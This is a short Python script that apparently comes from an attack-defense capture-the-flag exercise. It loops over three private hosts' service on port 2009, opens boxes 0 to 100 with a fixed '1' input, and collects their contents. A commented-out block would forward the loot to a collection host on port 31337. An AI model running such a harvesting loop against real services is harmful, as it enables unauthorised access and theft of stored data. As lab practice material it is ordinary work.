from socket import *


HOSTS = ["10.96.19.53", "10.96.19.22", "10.96.19.102"]
SEND_HOST = "10.96.19.38"
SEND_PORT = 31337

PORT = 2009


def open_box(num, host, lis):
	with create_connection((host, PORT)) as sock:
		sock.send(b"open " + str(num).encode() + b"\r\n")
		sock.recv(1024)
		sock.send(b"1\r\n")
		sock.recv(1024)
		sock.send(b"get\r\n")
		buff = sock.recv(1024)
		if buff != b'\n':
			lis.append(buff.rstrip())
		sock.send(b"close\r\n")
		sock.recv(1024)


def main():
	for host in HOSTS:
		l = []
		for num in range(101):
			open_box(num, host, l)
		print(l)

"""
		with create_connection((SEND_HOST, SEND_PORT)) as send_sock:
			send_sock.recv(1024)
			for e in l:
				send_sock.send(e)
				print(send_sock.recv(1024))
"""

if __name__ == '__main__':
	main()